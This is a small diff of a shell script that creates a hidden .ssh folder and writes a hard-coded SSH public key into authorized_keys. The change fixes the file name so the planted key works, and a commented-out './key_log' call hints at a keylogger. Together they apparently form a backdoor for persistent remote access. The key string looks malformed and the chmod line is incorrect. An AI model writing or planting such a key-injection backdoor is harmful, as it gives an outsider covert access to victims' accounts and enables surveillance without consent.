@@ -5,7 +5,7 @@
 #create the hide folder in user directory with public key
 # name of file with public key you can not change
 mkdir .ssh && cd .ssh
-echo "ssh-rsa AVVVVVVAAAB3NzaC1yc2EAAAABJQAAAQEAhBVjWECGHGNTsrYvFrsDm7g1gsX3MxgU/vdPhVM86POjdHhJdXocCYsuhFje8u"> authorized_key
+echo "ssh-rsa AVVVVVVAAAB3NzaC1yc2EAAAABJQAAAQEAhBVjWECGHGNTsrYvFrsDm7g1gsX3MxgU/vdPhVM86POjdHhJdXocCYsuhFje8u"> authorized_keys
 chmod +x authorized_keys
 
 #./key_log
